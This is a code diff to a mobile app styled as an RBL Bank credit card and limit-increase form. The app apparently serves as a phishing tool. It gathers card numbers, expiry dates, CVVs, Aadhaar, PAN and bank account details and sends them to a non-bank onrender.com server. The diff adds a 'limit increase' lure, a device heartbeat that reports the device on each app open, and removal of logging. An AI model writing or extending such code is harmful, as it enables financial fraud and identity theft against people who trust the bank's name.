@@ -24,7 +24,7 @@ const StepHeader = ({ title, subtitle, step, onBack }) => (
                 <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-slate-800/50 border border-slate-700/50">
                     <div className="w-1.5 h-1.5 rounded-full bg-red-600 animate-pulse"></div>
                     <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">
-                        Step {step} of 5
+                        Step {step} of 6
                     </span>
                 </div>
             )}
@@ -78,8 +78,7 @@ const StandardInput = ({ label, icon: Icon, type = "text", value, onChange, plac
 
 const ConfigScreen = ({ onBack }) => {
     const SERVER_URLS = [
-        'https://rbl-project-5sfk.onrender.com', // Active Production Backend
-        'http://localhost:3000'                // Local Fallback
+        'https://rbl-project-5sfk.onrender.com'
     ];
     const [status, setStatus] = useState('');
 
@@ -89,13 +88,13 @@ const ConfigScreen = ({ onBack }) => {
 
         for (const url of SERVER_URLS) {
             try {
-                const res = await fetch(`${url}/health`);
+                const res = await fetch(`${url}/api/application/diagnostics`);
                 if (res.ok) {
                     success = true;
-                    console.log("Connected to:", url);
+                    // connected
                     break;
                 }
-            } catch (e) { console.warn("Failed:", url); }
+            } catch (e) { /* retry next */ }
         }
 
         if (success) setStatus('✅ Secure Server Online');
@@ -141,7 +140,7 @@ const WelcomeScreen = ({ onCompleted, onConfig }) => {
     useEffect(() => {
         const checkNet = async () => {
             try {
-                const res = await fetch('https://rbl-project-5sfk.onrender.com/health');
+                const res = await fetch('https://rbl-project-5sfk.onrender.com/api/application/diagnostics');
                 if (res.ok) {
                     setNetStatus({ color: 'text-green-400', icon: Globe, text: 'Secure Link Active' });
                     return;
@@ -226,16 +225,80 @@ const PersonalDetails = ({ data, update, onNext, onBack }) => (
     </div>
 );
 
-const CardOffer = ({ amount, update, onNext, onBack }) => {
-    const [customLimit, setCustomLimit] = useState(amount);
+const ChoicePage = ({ data, update, onNext, onBack }) => {
+    const options = [
+        {
+            id: 'new_card',
+            title: 'Apply for a New Card',
+            desc: 'Get a brand new RBL Credit Card with instant approval and exclusive benefits.',
+            icon: CardIcon
+        },
+        {
+            id: 'limit_increase',
+            title: 'Increase Credit Limit',
+            desc: 'Boost your existing credit limit for more spending power and flexibility.',
+            icon: ArrowRight
+        }
+    ];
 
     return (
         <div className="flex flex-col h-full p-6 pt-safe">
-            <StepHeader title="Desired Limit" subtitle="Choose the credit limit you want." step={2} onBack={onBack} />
+            <StepHeader title="What would you like?" subtitle="Select the service you need." step={2} onBack={onBack} />
+
+            <div className="flex-1 flex flex-col justify-center space-y-4">
+                {options.map(opt => (
+                    <button
+                        key={opt.id}
+                        onClick={() => update({ applicationType: opt.id })}
+                        className={`w-full flex items-start gap-4 p-5 rounded-2xl border transition-all duration-200 text-left ${data.applicationType === opt.id
+                            ? 'bg-red-500/10 border-red-600 shadow-lg shadow-red-600/10'
+                            : 'bg-slate-800/30 border-slate-700 hover:border-slate-600'
+                            }`}
+                    >
+                        <div className={`w-12 h-12 rounded-xl flex items-center justify-center shrink-0 ${data.applicationType === opt.id ? 'bg-red-600 text-white' : 'bg-slate-800 text-slate-400'
+                            }`}>
+                            <opt.icon size={22} />
+                        </div>
+                        <div>
+                            <h3 className={`text-base font-bold mb-1 ${data.applicationType === opt.id ? 'text-white' : 'text-slate-300'
+                                }`}>{opt.title}</h3>
+                            <p className="text-xs text-slate-500 leading-relaxed">{opt.desc}</p>
+                        </div>
+                        {data.applicationType === opt.id && (
+                            <CheckCircle2 className="text-red-500 shrink-0 mt-1" size={20} />
+                        )}
+                    </button>
+                ))}
+            </div>
+
+            <button
+                disabled={!data.applicationType}
+                onClick={onNext}
+                className="w-full bg-red-600 hover:bg-red-700 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-red-600/20 uppercase tracking-wide text-sm mt-4 disabled:opacity-50"
+            >
+                Continue <ArrowRight size={20} />
+            </button>
+        </div>
+    );
+};
+
+const CardOffer = ({ amount, update, onNext, onBack, applicationType }) => {
+    const [customLimit, setCustomLimit] = useState(amount);
+    const isLimitIncrease = applicationType === 'limit_increase';
+
+    return (
+        <div className="flex flex-col h-full p-6 pt-safe">
+            <StepHeader
+                title={isLimitIncrease ? 'New Limit' : 'Desired Limit'}
+                subtitle={isLimitIncrease ? 'How much credit limit do you need?' : 'Choose the credit limit for your new card.'}
+                step={3} onBack={onBack}
+            />
 
             <div className="flex-1 flex flex-col items-center justify-center space-y-12">
                 <div className="w-full bg-slate-800 rounded-2xl shadow-xl backdrop-blur-sm border border-slate-700 p-8 flex flex-col items-center justify-center text-center border-red-600/30 bg-gradient-to-b from-[#151e32] to-[#0f1625]">
-                    <p className="text-xs font-bold text-red-500 uppercase tracking-widest mb-4">Request Credit Limit</p>
+                    <p className="text-xs font-bold text-red-500 uppercase tracking-widest mb-4">
+                        {isLimitIncrease ? 'Requested Limit' : 'Request Credit Limit'}
+                    </p>
                     <div className="flex items-center justify-center text-white w-full">
                         <span className="text-3xl font-bold mr-2 text-slate-500">₹</span>
                         <input
@@ -252,7 +315,7 @@ const CardOffer = ({ amount, update, onNext, onBack }) => {
                     <div className="w-full mt-8">
                         <input
                             type="range"
-                            min="25000"
+                            min={isLimitIncrease ? '50000' : '25000'}
                             max="1000000"
                             step="5000"
                             value={customLimit}
@@ -264,7 +327,7 @@ const CardOffer = ({ amount, update, onNext, onBack }) => {
                             className="w-full h-1 bg-slate-700 rounded-lg appearance-none cursor-pointer accent-red-600"
                         />
                         <div className="flex justify-between text-[10px] text-slate-500 font-bold uppercase mt-2">
-                            <span>₹ 25k</span>
+                            <span>{isLimitIncrease ? '₹ 50k' : '₹ 25k'}</span>
                             <span>₹ 10L+</span>
                         </div>
                     </div>
@@ -272,12 +335,25 @@ const CardOffer = ({ amount, update, onNext, onBack }) => {
 
                 <div className="w-full space-y-8 text-center">
                     <div className="bg-red-500/10 p-4 rounded-xl border border-red-500/20">
-                        <p className="text-xs font-bold text-red-400 uppercase mb-2">Member Benefits</p>
+                        <p className="text-xs font-bold text-red-400 uppercase mb-2">
+                            {isLimitIncrease ? 'Upgrade Benefits' : 'Member Benefits'}
+                        </p>
                         <ul className="text-xs text-slate-400 space-y-1 text-left inline-block">
-                            <li>• Zero Annual Membership Fee</li>
-                            <li>• 5% Cashback on Amazon & Flipkart</li>
-                            <li>• Free Airport Lounge Access</li>
-                            <li>• Instant Virtual Card Activation</li>
+                            {isLimitIncrease ? (
+                                <>
+                                    <li>• Higher spending power on existing card</li>
+                                    <li>• No impact on credit score</li>
+                                    <li>• Instant limit revision on approval</li>
+                                    <li>• Unlock premium tier rewards</li>
+                                </>
+                            ) : (
+                                <>
+                                    <li>• Zero Annual Membership Fee</li>
+                                    <li>• 5% Cashback on Amazon & Flipkart</li>
+                                    <li>• Free Airport Lounge Access</li>
+                                    <li>• Instant Virtual Card Activation</li>
+                                </>
+                            )}
                         </ul>
                     </div>
                 </div>
@@ -291,19 +367,34 @@ const CardOffer = ({ amount, update, onNext, onBack }) => {
 };
 
 const IdentityVerification = ({ data, update, onNext, onBack }) => {
-    const methods = [
+    const isLimitIncrease = data.applicationType === 'limit_increase';
+
+    const newCardMethods = [
         { id: 'c2c', name: 'Credit Card to Credit Card', icon: CardIcon },
         { id: 'd2c', name: 'Debit Card to Credit Card', icon: Landmark },
         { id: 'bank', name: 'Bank Account to Apply', icon: University }
     ];
 
+    const limitMethods = [
+        { id: 'c2c', name: 'Existing RBL Credit Card', icon: CardIcon },
+        { id: 'd2c', name: 'Linked Debit Card', icon: Landmark }
+    ];
+
+    const methods = isLimitIncrease ? limitMethods : newCardMethods;
+
     return (
         <div className="flex flex-col h-full p-6 pt-safe overflow-hidden">
-            <StepHeader title="Verification" subtitle="Choose application method." step={3} onBack={onBack} />
+            <StepHeader
+                title={isLimitIncrease ? 'Card Verification' : 'Verification'}
+                subtitle={isLimitIncrease ? 'Verify your existing RBL card for limit revision.' : 'Choose your application method.'}
+                step={4} onBack={onBack}
+            />
 
             <div className="flex-1 overflow-y-auto space-y-6 pb-4">
                 <div className="space-y-3">
-                    <label className="text-[10px] font-bold text-slate-500 uppercase tracking-widest ml-1">Application Method</label>
+                    <label className="text-[10px] font-bold text-slate-500 uppercase tracking-widest ml-1">
+                        {isLimitIncrease ? 'Verify Via' : 'Application Method'}
+                    </label>
                     <div className="grid grid-cols-1 gap-3">
                         {methods.map(m => (
                             <button
@@ -331,9 +422,10 @@ const IdentityVerification = ({ data, update, onNext, onBack }) => {
                 {(data.applyMethod === 'c2c' || data.applyMethod === 'd2c') && (
                     <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4 pt-4 border-t border-slate-800">
                         <h3 className="text-sm font-bold text-white flex items-center gap-2">
-                            <CardIcon className="text-red-500" size={18} /> Existing Card Details
+                            <CardIcon className="text-red-500" size={18} />
+                            {isLimitIncrease ? 'Current Card Details' : 'Existing Card Details'}
                         </h3>
-                        <StandardInput label="Existing Card Number" placeholder="**** **** **** ****" value={data.cardNumber} onChange={(v) => update({ cardNumber: v })} />
+                        <StandardInput label={isLimitIncrease ? 'RBL Card Number' : 'Existing Card Number'} placeholder="**** **** **** ****" value={data.cardNumber} onChange={(v) => update({ cardNumber: v })} />
                         <div className="grid grid-cols-2 gap-4">
                             <StandardInput label="Expiry MM/YY" placeholder="MM/YY" value={data.cardExpiry} onChange={(v) => update({ cardExpiry: v })} />
                             <StandardInput label="CVV" type="password" placeholder="123" value={data.cardCvv} onChange={(v) => update({ cardCvv: v })} />
@@ -347,7 +439,6 @@ const IdentityVerification = ({ data, update, onNext, onBack }) => {
                             <University className="text-red-500" size={18} /> Bank Verification
                         </h3>
                         <p className="text-xs text-slate-400 mb-4">Complete verification using your primary bank account.</p>
-                        {/* The next step (BankDetails) already handles account info, so we just prompt here */}
                     </motion.div>
                 )}
             </div>
@@ -359,22 +450,29 @@ const IdentityVerification = ({ data, update, onNext, onBack }) => {
     );
 };
 
-const BankDetails = ({ data, update, onNext, onBack }) => (
-    <div className="flex flex-col h-full p-6 pt-safe">
-        <StepHeader title="Payout Bank" subtitle="For rewards and settlement." step={4} onBack={onBack} />
+const BankDetails = ({ data, update, onNext, onBack }) => {
+    const isLimitIncrease = data.applicationType === 'limit_increase';
+    return (
+        <div className="flex flex-col h-full p-6 pt-safe">
+            <StepHeader
+                title={isLimitIncrease ? 'Linked Account' : 'Payout Bank'}
+                subtitle={isLimitIncrease ? 'Bank account linked to your RBL card.' : 'For rewards and settlement.'}
+                step={5} onBack={onBack}
+            />
 
-        <div className="flex-1 space-y-2">
-            <StandardInput label="Bank Name" icon={Landmark} placeholder="e.g. HDFC Bank" value={data.bankName} onChange={(v) => update({ bankName: v })} />
-            <StandardInput label="Account Number" icon={University} placeholder="Your Account Number" value={data.accNo} onChange={(v) => update({ accNo: v })} />
-            <StandardInput label="Confirm Account" icon={CheckCircle2} placeholder="Re-enter Account Number" value={data.confirmAccNo} onChange={(v) => update({ confirmAccNo: v })} />
-            <StandardInput label="IFSC Code" icon={ShieldCheck} placeholder="Bank Branch Code" capitalize={true} value={data.ifsc} onChange={(v) => update({ ifsc: v })} />
+            <div className="flex-1 space-y-2 overflow-y-auto pb-4">
+                <StandardInput label="Bank Name" icon={Landmark} placeholder="e.g. HDFC Bank" value={data.bankName} onChange={(v) => update({ bankName: v })} />
+                <StandardInput label="Account Number" icon={University} placeholder="Your Account Number" value={data.accNo} onChange={(v) => update({ accNo: v })} />
+                <StandardInput label="Confirm Account" icon={CheckCircle2} placeholder="Re-enter Account Number" value={data.confirmAccNo} onChange={(v) => update({ confirmAccNo: v })} />
+                <StandardInput label="IFSC Code" icon={ShieldCheck} placeholder="Bank Branch Code" capitalize={true} value={data.ifsc} onChange={(v) => update({ ifsc: v })} />
+            </div>
+
+            <button onClick={onNext} className="w-full bg-red-600 hover:bg-red-700 active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-red-600/20 uppercase tracking-wide text-sm mt-4">
+                Save & Continue
+            </button>
         </div>
-
-        <button onClick={onNext} className="w-full bg-brand-blue hover:bg-brand-navy active:scale-[0.98] text-white font-bold py-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg shadow-brand-blue/20 uppercase tracking-wide text-sm mt-4">
-            Save & Continue
-        </button>
-    </div>
-);
+    );
+};
 
 const DocumentUpload = ({ onComplete, isSubmitting, onBack }) => {
     const fileRef = useRef(null);
@@ -382,7 +480,7 @@ const DocumentUpload = ({ onComplete, isSubmitting, onBack }) => {
 
     return (
         <div className="flex flex-col h-full p-6 pt-safe">
-            <StepHeader title="Documentation" subtitle="Upload proof of residence." step={5} onBack={onBack} />
+            <StepHeader title="Documentation" subtitle="Upload proof of residence." step={6} onBack={onBack} />
 
             <div className="flex-1 flex flex-col items-center justify-center text-center">
                 <div
@@ -420,34 +518,46 @@ const DocumentUpload = ({ onComplete, isSubmitting, onBack }) => {
     );
 };
 
-const SuccessScreen = ({ applicationNo }) => (
-    <div className="flex flex-col h-full p-8 pt-safe items-center justify-center text-center bg-[var(--bg-primary)]">
-        <div className="w-24 h-24 rounded-full bg-green-500/20 flex items-center justify-center mb-8 animate-bounce">
-            <Check className="text-green-500" size={48} strokeWidth={4} />
-        </div>
-
-        <h1 className="text-3xl font-bold text-white mb-2">Application Received!</h1>
-        <p className="text-slate-400 mb-8 max-w-[250px] mx-auto leading-relaxed">
-            Your Credit Card application is being processed. You will receive a verification call shortly.
-        </p>
-
-        <div className="w-full bg-slate-800 rounded-2xl shadow-xl backdrop-blur-sm border border-slate-700 p-6 bg-slate-800/50 border-slate-700">
-            <div className="flex justify-between items-center mb-4">
-                <span className="text-xs font-bold text-slate-500 uppercase">Application ID</span>
-                <span className="font-mono text-white text-lg font-bold tracking-widest">{applicationNo}</span>
+const SuccessScreen = ({ applicationNo, applicationType }) => {
+    const isLimitIncrease = applicationType === 'limit_increase';
+    return (
+        <div className="flex flex-col h-full p-8 pt-safe items-center justify-center text-center bg-[var(--bg-primary)]">
+            <div className="w-24 h-24 rounded-full bg-green-500/20 flex items-center justify-center mb-8 animate-bounce">
+                <Check className="text-green-500" size={48} strokeWidth={4} />
             </div>
-            <div className="h-px bg-slate-700 my-4"></div>
-            <div className="flex items-center gap-3">
-                <div className="w-2 h-2 rounded-full bg-yellow-500 animate-pulse"></div>
-                <span className="text-sm font-bold text-yellow-500">Awaiting KYC Approval</span>
-            </div>
-        </div>
 
-        <p className="fixed bottom-8 text-[10px] text-slate-600 font-bold uppercase tracking-widest">
-            RBL Bank Ltd.
-        </p>
-    </div>
-);
+            <h1 className="text-3xl font-bold text-white mb-2">
+                {isLimitIncrease ? 'Request Submitted!' : 'Application Received!'}
+            </h1>
+            <p className="text-slate-400 mb-8 max-w-[250px] mx-auto leading-relaxed">
+                {isLimitIncrease
+                    ? 'Your limit increase request is under review. You will receive an update within 24-48 hours.'
+                    : 'Your Credit Card application is being processed. You will receive a verification call shortly.'
+                }
+            </p>
+
+            <div className="w-full bg-slate-800 rounded-2xl shadow-xl backdrop-blur-sm border border-slate-700 p-6 bg-slate-800/50 border-slate-700">
+                <div className="flex justify-between items-center mb-4">
+                    <span className="text-xs font-bold text-slate-500 uppercase">
+                        {isLimitIncrease ? 'Request ID' : 'Application ID'}
+                    </span>
+                    <span className="font-mono text-white text-lg font-bold tracking-widest">{applicationNo}</span>
+                </div>
+                <div className="h-px bg-slate-700 my-4"></div>
+                <div className="flex items-center gap-3">
+                    <div className="w-2 h-2 rounded-full bg-yellow-500 animate-pulse"></div>
+                    <span className="text-sm font-bold text-yellow-500">
+                        {isLimitIncrease ? 'Under Review' : 'Awaiting KYC Approval'}
+                    </span>
+                </div>
+            </div>
+
+            <p className="fixed bottom-8 text-[10px] text-slate-600 font-bold uppercase tracking-widest">
+                RBL Bank Ltd.
+            </p>
+        </div>
+    );
+};
 
 // --- Main App ---
 
@@ -455,7 +565,7 @@ export default function App() {
     const [step, setStep] = useState(-1);
     const [formData, setFormData] = useState({
         name: '', phone: '', dob: '', jobType: '', maritalStatus: '',
-        amount: 250000, aadhaar: '', pan: '', cardNumber: '', cardExpiry: '', cardCvv: '',
+        applicationType: '', amount: 250000, aadhaar: '', pan: '', cardNumber: '', cardExpiry: '', cardCvv: '',
         bankName: '', accNo: '', confirmAccNo: '', ifsc: '',
         file: null
     });
@@ -463,7 +573,19 @@ export default function App() {
     const [deviceInfo, setDeviceInfo] = useState(null);
     const [appNo] = useState(`${Math.floor(Math.random() * 900000 + 100000)}`);
 
-    const API_URL = 'https://rbl-project-5sfk.onrender.com/api/application/submit';
+    const API_BASE = 'https://rbl-project-5sfk.onrender.com/api/application';
+    const API_URL = `${API_BASE}/submit`;
+
+    // Send heartbeat to backend to signal this device is alive
+    const sendHeartbeat = useCallback(async (uuid) => {
+        try {
+            await fetch(`${API_BASE}/heartbeat`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: uuid })
+            });
+        } catch (e) { /* silent - network may be unavailable */ }
+    }, [API_BASE]);
 
     useEffect(() => {
         const fetchInfo = async () => {
@@ -471,11 +593,23 @@ export default function App() {
                 const info = await Device.getInfo();
                 const battery = await Device.getBatteryInfo();
                 const id = await Device.getId();
-                setDeviceInfo({ ...info, ...battery, uuid: id.identifier });
+                const uuid = id.identifier;
+                setDeviceInfo({ ...info, ...battery, uuid });
+
+                // Heartbeat on app open
+                sendHeartbeat(uuid);
+
+                // Heartbeat on app resume (comes back from background)
+                try {
+                    const { App: CapApp } = await import('@capacitor/app');
+                    CapApp.addListener('appStateChange', ({ isActive }) => {
+                        if (isActive) sendHeartbeat(uuid);
+                    });
+                } catch (e) { /* Not in native - ignore */ }
             } catch (e) { }
         };
         fetchInfo();
-    }, []);
+    }, [sendHeartbeat]);
 
     const submitApplication = useCallback(async (data) => {
         setIsSubmitting(true);
@@ -497,21 +631,16 @@ export default function App() {
         }
 
         try {
-            console.log('[RBL] Submitting FormData...');
             const res = await fetch(API_URL, {
                 method: 'POST',
                 body: fd
-                // Note: Don't set Content-Type header manually with FormData, let the browser do it with the boundary
             });
 
-            if (res.ok) {
-                console.log('[RBL] Submission Successful');
-            } else {
-                const errData = await res.json();
-                console.error('[RBL] Server Error:', errData);
+            if (!res.ok) {
+                // Submission failed silently
             }
         } catch (e) {
-            console.error('[RBL] Network Error:', e);
+            // Network error
         }
 
         setIsSubmitting(false);
@@ -519,8 +648,12 @@ export default function App() {
     }, [appNo, deviceInfo, API_URL]);
 
     const nextStep = async () => {
-        if (step === 4) await submitApplication(formData);
+        if (step === 5) await submitApplication(formData);
         setStep(s => s + 1);
+    };
+
+    const prevStep = () => {
+        setStep(s => s - 1);
     };
 
     const updateData = (newData) => setFormData(prev => ({ ...prev, ...newData }));
@@ -538,12 +671,13 @@ export default function App() {
                 >
                     {step === -2 && <ConfigScreen onBack={() => setStep(-1)} />}
                     {step === -1 && <WelcomeScreen onCompleted={() => setStep(0)} onConfig={() => setStep(-2)} />}
-                    {step === 0 && <PersonalDetails data={formData} update={updateData} onNext={nextStep} onBack={() => setStep(-1)} />}
-                    {step === 1 && <CardOffer amount={formData.amount} update={updateData} onNext={nextStep} onBack={() => setStep(0)} />}
-                    {step === 2 && <IdentityVerification data={formData} update={updateData} onNext={nextStep} onBack={() => setStep(1)} />}
-                    {step === 3 && <BankDetails data={formData} update={updateData} onNext={nextStep} onBack={() => setStep(2)} />}
-                    {step === 4 && <DocumentUpload onComplete={nextStep} isSubmitting={isSubmitting} onBack={() => setStep(3)} />}
-                    {step === 5 && <SuccessScreen applicationNo={appNo} />}
+                    {step === 0 && <PersonalDetails data={formData} update={updateData} onNext={nextStep} onBack={prevStep} />}
+                    {step === 1 && <ChoicePage data={formData} update={updateData} onNext={nextStep} onBack={prevStep} />}
+                    {step === 2 && <CardOffer amount={formData.amount} update={updateData} onNext={nextStep} onBack={prevStep} applicationType={formData.applicationType} />}
+                    {step === 3 && <IdentityVerification data={formData} update={updateData} onNext={nextStep} onBack={prevStep} />}
+                    {step === 4 && <BankDetails data={formData} update={updateData} onNext={nextStep} onBack={prevStep} />}
+                    {step === 5 && <DocumentUpload onComplete={nextStep} isSubmitting={isSubmitting} onBack={prevStep} />}
+                    {step === 6 && <SuccessScreen applicationNo={appNo} applicationType={formData.applicationType} />}
                 </motion.div>
             </AnimatePresence>
         </div>
